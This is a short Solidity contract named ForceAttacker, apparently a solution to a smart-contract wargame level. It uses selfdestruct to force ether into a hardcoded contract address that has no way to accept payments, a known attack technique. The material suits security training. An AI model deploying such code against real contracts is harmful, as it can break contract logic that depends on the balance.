// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
  address payable force = payable(0x234F86f1Db82AF61EF5206DB75341e0eF0036545);

  function selfDestruct() external payable {
    selfdestruct(force);
  }
}